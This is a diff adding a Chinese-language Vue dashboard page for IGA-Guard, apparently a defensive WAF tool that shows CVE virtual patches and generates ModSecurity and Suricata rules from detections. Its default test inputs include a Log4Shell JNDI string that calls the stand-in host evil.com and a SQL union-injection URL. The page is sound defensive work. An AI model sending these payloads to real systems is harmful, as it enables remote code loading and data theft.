@@ -1,0 +1,121 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>P6 规则中心 · IGA-Guard</title>
+  <link rel="stylesheet" href="/static/assets/common.css" />
+  <script src="https://unpkg.com/vue@3/dist/vue.global.prod.js"></script>
+  <script src="/static/assets/iga-common.js"></script>
+</head>
+<body>
+<div id="app">
+  <header class="iga-header">
+    <div>
+      <h1>IGA-Guard 3.0 · P6 规则中心</h1>
+      <small id="iga-subtitle">虚拟补丁 · ModSecurity 规则自动生成</small>
+    </div>
+    <span class="badge">v{{ version }} · {{ health }}</span>
+  </header>
+  <nav id="iga-nav" class="iga-nav"></nav>
+
+  <div class="grid grid-2">
+    <div class="card">
+      <h2>虚拟补丁库 (CVE)</h2>
+      <div v-for="p in patches" :key="p.cve_id" style="margin-bottom:.75rem;padding:.65rem;background:#0b1220;border-radius:8px;border:1px solid #334155">
+        <p style="margin:0;font-weight:600">{{ p.cve_id }} · {{ p.name }}</p>
+        <p style="margin:.25rem 0;font-size:.75rem;color:#64748b">类型 {{ p.label }} · {{ p.action }}</p>
+        <div class="rule-block">{{ p.modsecurity_preview }}</div>
+      </div>
+    </div>
+
+    <div class="card">
+      <h2>载荷规则匹配</h2>
+      <div class="row">
+        <input v-model="testPayload" style="flex:1" placeholder="输入载荷测试虚拟补丁" />
+        <button @click="matchPatch">匹配</button>
+      </div>
+      <div v-if="patchMatch" class="nl" style="border-left-color:#dc2626;margin-top:.5rem">
+        <p>命中: {{ patchMatch.cve_id }} · {{ patchMatch.name }}</p>
+        <div class="rule-block">{{ patchMatch.modsecurity }}</div>
+      </div>
+      <p v-else-if="patchChecked" style="color:#64748b;font-size:.85rem">未命中已知 CVE 虚拟补丁</p>
+    </div>
+
+    <div class="card span2">
+      <h2>检测驱动规则生成</h2>
+      <div class="row">
+        <input v-model="url" style="flex:1" />
+        <button @click="detectAndRule">检测并生成规则</button>
+      </div>
+      <div v-if="generatedRule" style="margin-top:.75rem">
+        <p>类型 <strong>{{ generatedRule.type }}</strong> · 置信度 {{ (generatedRule.confidence*100).toFixed(1) }}%</p>
+        <p style="font-size:.75rem;color:#64748b">ModSecurity</p>
+        <div class="rule-block">{{ generatedRule.modsecurity }}</div>
+        <p style="font-size:.75rem;color:#64748b;margin-top:.5rem">Suricata</p>
+        <div class="rule-block">{{ generatedRule.suricata }}</div>
+      </div>
+      <div v-if="vpRule" style="margin-top:.75rem">
+        <p style="font-size:.75rem;color:#64748b">虚拟补丁（pipeline 快路径）</p>
+        <div class="rule-block">{{ vpRule }}</div>
+      </div>
+    </div>
+
+    <div class="card span2">
+      <h2>近期告警规则快照</h2>
+      <div v-if="!alertRules.length" style="color:#64748b">暂无带规则的告警</div>
+      <div v-for="(r,i) in alertRules" :key="i" style="margin-bottom:.75rem">
+        <p style="font-size:.8rem">{{ r.url?.slice(0,80) }} · {{ r.detection?.label }}</p>
+        <div class="rule-block" v-if="r.rule?.modsecurity">{{ r.rule.modsecurity }}</div>
+        <div class="rule-block" v-else-if="r.rule?.modsecurity_vp">{{ r.rule.modsecurity_vp }}</div>
+      </div>
+    </div>
+  </div>
+</div>
+<script>
+const { createApp } = Vue;
+createApp({
+  data() {
+    return {
+      version: '3.0.0', health: '...', patches: [],
+      testPayload: '${jndi:ldap://evil.com/a}', patchMatch: null, patchChecked: false,
+      url: 'http://demo/login?id=1+union+select+1,2--',
+      generatedRule: null, vpRule: null, alertRules: [],
+    };
+  },
+  mounted() {
+    igaMountShell('p6');
+    igaFetchHealth(this);
+    this.loadPatches();
+    this.loadAlertRules();
+  },
+  methods: {
+    async loadPatches() {
+      const d = await fetch('/api/rules/virtual-patches').then((r) => r.json());
+      this.patches = d.patches || [];
+    },
+    async matchPatch() {
+      const d = await fetch('/api/rules/match', {
+        method: 'POST', headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ payload: this.testPayload }),
+      }).then((r) => r.json());
+      this.patchMatch = d.match;
+      this.patchChecked = true;
+    },
+    async detectAndRule() {
+      const d = await fetch('/api/detect', {
+        method: 'POST', headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ method: 'GET', url: this.url }),
+      }).then((r) => r.json());
+      this.generatedRule = d.rule;
+      this.vpRule = d.rule?.modsecurity_vp || null;
+    },
+    async loadAlertRules() {
+      const d = await fetch('/api/alerts').then((r) => r.json());
+      this.alertRules = (d.alerts || []).filter((a) => a.rule);
+    },
+  },
+}).mount('#app');
+</script>
+</body>
+</html>
